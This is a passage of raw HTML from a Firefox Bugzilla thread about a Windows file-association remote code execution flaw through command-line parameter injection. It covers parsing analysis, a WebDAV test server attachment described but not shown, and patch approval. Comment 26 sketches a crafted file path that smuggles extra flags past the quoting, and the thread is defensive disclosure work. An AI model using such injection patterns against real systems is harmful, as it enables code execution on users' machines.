    <table class="layout-table change-head reporter" id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a473666_600971"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 15:20 PST" data-time="1578439212">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-19" data-comment-id="14578920" data-ismarkdown="true" ><p>The chrome team (on a separate bug report) made a comment that might apply here:</p>
<blockquote>
<p>... We need some logic that does something sensible when writing this key. One possibility: when installing, only populate Applications (and App Paths) if no such registration exists. Or maybe make sure it&#39;s the &quot;most stable&quot; of the various install modes (e.g., if system-level dev and beta are both installed, beta wins). We&#39;d also want some repair on uninstall: when uninstalling beta, dev should magically take over. When any mode of installation is made a user&#39;s default browser, write its config in that user&#39;s HKCU hive. ...</p>
</blockquote>
</div></div><div class="change-set" id="c20"><div class="comment" data-id="14578925" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a473666_600971"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 15:25 PST" data-time="1578439513">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-20" data-comment-id="14578925" data-ismarkdown="true" ><p>(In reply to Joshua Graham from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c19" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #19</a>)</p>
<blockquote>
<p>The chrome team (on a separate bug report) made a comment that might apply here:</p>
<blockquote>
<p>... We need some logic that does something sensible when writing this key. One possibility: when installing, only populate Applications (and App Paths) if no such registration exists. Or maybe make sure it&#39;s the &quot;most stable&quot; of the various install modes (e.g., if system-level dev and beta are both installed, beta wins). We&#39;d also want some repair on uninstall: when uninstalling beta, dev should magically take over. When any mode of installation is made a user&#39;s default browser, write its config in that user&#39;s HKCU hive. ...</p>
</blockquote>
</blockquote>
<p>That is relevant, thank you. We have really all of these same problems, but what&#39;s in my patch isn&#39;t this sophisticated, partly because I don&#39;t think it&#39;s worth the effort, but also because I don&#39;t think it&#39;s appropriate for me to make decisions for the user about what channel they meant to be using.</p>
</div></div><div class="change-set" id="c21"><div class="comment" data-id="14579371" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a473666_600971"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-08 00:15 PST" data-time="1578471326">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9119318"
         class="attachment"
         data-id="9119318" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="firefox.js">
      <meta itemprop="contentSize" content="8218">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9119318" itemprop="contentUrl">
        <span id="att-9119318-description" itemprop="description">Simple node WebDAV server that will respond to any folder/file name</span></a>
        — <a href="attachment.cgi?id=9119318&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-21" data-comment-id="14579371" data-ismarkdown="true" ><p>This is a simple WebDAV server that you can use to test <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">bug 1606596</a>. To make it work install node/npm, install express (<code>nmp install express</code> ) and start the server <code>node firefox.js 80 pdf</code>.</p>
</div></div><div class="change-set" id="c22"><div class="comment" data-id="14581388" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a473666_600971"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-08 16:07 PST" data-time="1578528433">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-22" data-comment-id="14581388" data-ismarkdown="true" ><p>If this ends up getting credited in the change log could you please make the credit:</p>
<p>Joshua Graham of TSS &amp; Brendan Scarvell</p>
<p>If you have to use a single name just:</p>
<p>Brendan Scarvell</p>
<p>Brendan&#39;s name was left out of <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1530103" title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox">bug 1530103</a> and he deserves credit. :-). If there is a bounty, does Firefox match if we donate it to charity? I would like to give the money to one of the Australian bush fire charities.</p>
</div></div><div class="change-set" id="c23"><div class="comment" data-id="14583005" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_417288" id="a473666_600971"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_417288" id="a473666_600971"><a class="email " href="/user_profile?user_id=417288" > <span class="fna">Nathan Froyd [:froydnj]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-09 09:55 PST" data-time="1578592529">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-23" data-comment-id="14583005" data-ismarkdown="true" ><p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c10" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #10</a>)</p>
<blockquote>
<p>(In reply to Mike Hommey [:glandium] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c8" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #8</a>)</p>
<blockquote>
<p>I wonder at what stage of the command line &quot;parsing&quot; we end up considering what was supposed to be passed as one argument as multiple ones, including flags.</p>
</blockquote>
<p>I expect it&#39;s just that we get the arguments&#39; argv/argc combo in <code>main()</code> with the wrong values? The docs at <a href="https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments" rel="nofollow">https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments</a> (and the sad tales at <a href="https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" rel="nofollow">https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</a> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)</p>
<p>Would we be able to usefully put things back together at that point, in a way that wouldn&#39;t break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?</p>
</blockquote>
<p>I&#39;m unclear on what the question here is.  Are you asking &quot;should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate <code>argv</code> values and try to reassemble them&quot;?  That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(nfroyd)</span></div></div></div><div class="change-set" id="c24"><div class="comment" data-id="14583017" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a473666_600971"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-09 09:59 PST" data-time="1578592777">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-24" data-comment-id="14583017" data-ismarkdown="true" ><p>(In reply to Nathan Froyd [:froydnj] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c23" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #23</a>)</p>
<p>Yeah, sorry for rambling. Let me try to clarify inline. I think I have two questions:</p>
<blockquote>
<p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c10" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #10</a>)</p>
<blockquote>
<p>(In reply to Mike Hommey [:glandium] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c8" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #8</a>)</p>
<blockquote>
<p>I wonder at what stage of the command line &quot;parsing&quot; we end up considering what was supposed to be passed as one argument as multiple ones, including flags.</p>
</blockquote>
<p>I expect it&#39;s just that we get the arguments&#39; argv/argc combo in <code>main()</code> with the wrong values? The docs at <a href="https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments" rel="nofollow">https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments</a> (and the sad tales at <a href="https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" rel="nofollow">https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</a> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)</p>
</blockquote>
</blockquote>
<p>Does this seem like an accurate read of what&#39;s going on?</p>
<blockquote>
<blockquote>
<p>Would we be able to usefully put things back together at that point, in a way that wouldn&#39;t break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?</p>
</blockquote>
<p>I&#39;m unclear on what the question here is.  Are you asking &quot;should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate <code>argv</code> values and try to reassemble them&quot;?  That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).</p>
</blockquote>
<p>And yes, the &quot;do we have a chance to recover from the OS&#39;s mistake&quot;, and you kinda answered that one...</p>
</div><div class="activity"><div class="change">Flags: needinfo?(nfroyd)</div></div></div><div class="change-set" id="c25"><div class="comment" data-id="14583242" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_141755" id="a473666_600971"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_141755" id="a473666_600971"><a class="email " href="/user_profile?user_id=141755" > <span class="fna">Robert Strong (they/them - no direct email)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-09 11:16 PST" data-time="1578597378">2 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1606596&amp;comment_id=14583242"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-25" data-comment-id="14583242" data-ismarkdown="true" ><p>No idea if this is helpful but there is a command line argument test that checks the reassembly of command line arguments when having to relaunch Firefox with the original command line under<br>
<a href="https://searchfox.org/mozilla-central/source/toolkit/xre/test/win" rel="nofollow">https://searchfox.org/mozilla-central/source/toolkit/xre/test/win</a></p>
<p>It verifies that our argument cleanup is equivalent to the cleanup performed by the OS. The arguments it tests are in<br>
<a href="https://searchfox.org/mozilla-central/source/toolkit/xre/test/win/TestXREMakeCommandLineWin.ini" rel="nofollow">https://searchfox.org/mozilla-central/source/toolkit/xre/test/win/TestXREMakeCommandLineWin.ini</a></p>
</div></div><div class="change-set" id="c26"><div class="comment" data-id="14583343" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_417288" id="a473666_600971"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_417288" id="a473666_600971"><a class="email " href="/user_profile?user_id=417288" > <span class="fna">Nathan Froyd [:froydnj]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-09 11:52 PST" data-time="1578599529">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-26" data-comment-id="14583343" data-ismarkdown="true" ><p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c24" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #24</a>)</p>
<blockquote>
<blockquote>
<p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c10" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #10</a>)</p>
<blockquote>
<p>(In reply to Mike Hommey [:glandium] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c8" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #8</a>)</p>
<blockquote>
<p>I wonder at what stage of the command line &quot;parsing&quot; we end up considering what was supposed to be passed as one argument as multiple ones, including flags.</p>
</blockquote>
<p>I expect it&#39;s just that we get the arguments&#39; argv/argc combo in <code>main()</code> with the wrong values? The docs at <a href="https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments" rel="nofollow">https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments</a> (and the sad tales at <a href="https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" rel="nofollow">https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</a> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)</p>
</blockquote>
</blockquote>
<p>Does this seem like an accurate read of what&#39;s going on?</p>
</blockquote>
<p>Yes.  For avoidance of doubt (and so somebody can correct me I&#39;m wrong, which is likely), my understanding is that we have:</p>
<pre><code>&quot;path\to\firefox.exe&quot; &quot;%1&quot;
</code></pre>
<p>in the registry for executing Firefox, and somebody specifies the weird string in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c0" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment 0</a>.  Through string substitution, we get:</p>
<pre><code>&quot;path\to\firefox.exe&quot; &quot;\\stuff\a.txt&quot; -flagsandstuff&quot;
</code></pre>
<p>and then...something...strips off quotes, so we have:</p>
<pre><code>path\to\firefox.exe \\stuff\a.txt -flagsandstuff[&quot;]
</code></pre>
<p>(not sure what happens to that last quote, I guess if you just <code>str.remove(&#39;&quot;&#39;)</code> or similar, it&#39;d be gone, rather than trying to balance quotes?)</p>
<p>Not sure what happens next, but I guess the exact steps don&#39;t matter: that command line eventually winds up being split on spaces to wind up in Firefox&#39;s <code>argv</code>?  (From my limited understanding, this all sounds terrible, and basically everybody would have to implement something similar to what mhowell&#39;s patch (and <code>-osint</code>?) does to avoid letting file arguments actually specify arbitrary command-line arguments?)</p>
<blockquote>
<blockquote>
<blockquote>
<p>Would we be able to usefully put things back together at that point, in a way that wouldn&#39;t break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?</p>
</blockquote>
<p>I&#39;m unclear on what the question here is.  Are you asking &quot;should we try to discern whether arguments that were meant to be usefully double-quoted actually got split into separate <code>argv</code> values and try to reassemble them&quot;?  That way sounds fraught with all sorts of terror (but maybe people already do this to cope with broken software?).</p>
</blockquote>
<p>And yes, the &quot;do we have a chance to recover from the OS&#39;s mistake&quot;, and you kinda answered that one...</p>
</blockquote>
<p>Yeah, I think looking at what we have in that last command line up there, we&#39;d have to infer the location of the double quote, and determine what elements of <code>argv</code> should effectively be re-concatenated, which isn&#39;t going to turn out well for anybody.  And I think this is a different scenario than rstrong posted in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c25" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment 25</a> (which is helpful; I didn&#39;t know about that test!): we&#39;re not trying to reassemble things to relaunch anything, but we&#39;re trying to discern whether arguments got split by whatever launched us in a way that was not intended.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(nfroyd)</span></div></div></div><div class="change-set" id="c27"><div class="comment" data-id="14585830" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a473666_600971"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-10 14:16 PST" data-time="1578694586">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-27" data-comment-id="14585830" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9119189" name="attach_9119189" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">attachment 9119189</a> <a href="/attachment.cgi?id=9119189&amp;action=edit" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">Bug 1606596</a> - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</p>
<h3>Security Approval Request</h3>
<ul>
<li><strong>How easily could an exploit be constructed based on the patch?</strong>: Not very easily I think; the patch necessarily points to a scenario where file associations with command lines missing a <code>-osint</code> can get created, but doesn&#39;t go into the implications of that.</li>
<li><strong>Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?</strong>: No</li>
<li><strong>Which older supported branches are affected by this flaw?</strong>: All</li>
<li><strong>If not all supported branches, which bug introduced the flaw?</strong>: None</li>
<li><strong>Do you have backports for the affected branches?</strong>: No</li>
<li><strong>If not, how different, hard to create, and risky will they be?</strong>: Should be trivial; code around this patch hasn&#39;t changed in years.</li>
<li><strong>How likely is this patch to cause regressions; how much testing does it need?</strong>: I&#39;m confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates, so regressing those is very unlikely.</li>
</ul>
<p>To be clear, I don&#39;t think of this patch as the real fix for the bug, just as a stopgap until the command line changes being discussed above are in. With something like this I can only patch one method of launching Firefox with attacker-controlled command-line parameters, but there are likely others, and I can&#39;t even guarantee that I&#39;m patching all existing file associations (because command lines might have been copied elsewhere in the registry).</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: sec-approval?</div></div></div><div class="change-set" id="c28"><div class="comment" data-id="14589983" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_578488" id="a473666_600971"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-13 12:18 PST" data-time="1578946731">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-28" data-comment-id="14589983" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9119189" name="attach_9119189" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">attachment 9119189</a> <a href="/attachment.cgi?id=9119189&amp;action=edit" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">Bug 1606596</a> - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</p>
<p>Approved to land and request uplift.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: sec-approval? &rarr; sec-approval+</div></div></div><div class="change-set" id="c29"><div class="comment" data-id="14590027" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a473666_600971"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
